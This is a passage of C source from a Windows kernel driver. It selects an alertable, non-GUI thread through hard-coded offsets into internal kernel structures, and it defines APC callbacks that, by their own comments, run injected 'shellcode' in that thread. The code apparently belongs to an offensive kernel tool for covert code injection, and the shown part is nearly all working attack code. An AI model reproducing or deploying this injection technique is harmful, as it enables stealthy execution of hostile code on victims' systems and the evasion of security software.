		if (!NT_SUCCESS(status) || PsIsThreadTerminating(*Thread)) {
			ObDereferenceObject(*Thread);
			*Thread = NULL;
			continue;
		}

		guiThread = *(PULONG64)((PUCHAR)*Thread + GUI_THREAD_FLAG_OFFSET) & GUI_THREAD_FLAG_BIT;
		alertableThread = *(PULONG64)((PUCHAR)*Thread + ALERTABLE_THREAD_FLAG_OFFSET) & ALERTABLE_THREAD_FLAG_BIT;

		if (guiThread != 0 ||
			alertableThread == 0 ||
			*(PULONG64)((PUCHAR)*Thread + THREAD_KERNEL_STACK_OFFSET) == 0 ||
			*(PULONG64)((PUCHAR)*Thread + THREAD_CONTEXT_STACK_POINTER_OFFSET) == 0) {
			ObDereferenceObject(*Thread);
			*Thread = NULL;
			continue;
		}
		break;
	}

	status = *Thread ? STATUS_SUCCESS : STATUS_NOT_FOUND;

CleanUp:
	if (originalInfo) {
		ExFreePoolWithTag(originalInfo, DRIVER_TAG);
		originalInfo = NULL;
	}

	return status;
}

/*
* Description:
* ApcInjectionCallback is responsible for handling the APC cleanup.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID ApcInjectionCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);
	UNREFERENCED_PARAMETER(NormalContext);

	if (PsIsThreadTerminating(PsGetCurrentThread()))
		*NormalRoutine = NULL;

	ExFreePoolWithTag(Apc, DRIVER_TAG);
}

/*
* Description:
* PrepareApcCallback is responsible for force the APC execution.
*
* Parameters:
* @Apc			   [PKAPC]			   -- The received APC.
* @NormalRoutine   [PKNORMAL_ROUTINE*] -- The executed routine, in our case, the shellcode.
* @NormalContext   [PVOID*]			   -- The first parameter.
* @SystemArgument1 [PVOID*]			   -- The second parameter.
* @SystemArgument2 [PVOID*]			   -- The third parameter.
*
* Returns:
* There is no return value.
*/
VOID PrepareApcCallback(PKAPC Apc, PKNORMAL_ROUTINE* NormalRoutine, PVOID* NormalContext, PVOID* SystemArgument1, PVOID* SystemArgument2) {
	UNREFERENCED_PARAMETER(NormalRoutine);
	UNREFERENCED_PARAMETER(NormalContext);
	UNREFERENCED_PARAMETER(SystemArgument1);
	UNREFERENCED_PARAMETER(SystemArgument2);

	KeTestAlertThread(UserMode);
	ExFreePoolWithTag(Apc, DRIVER_TAG);
}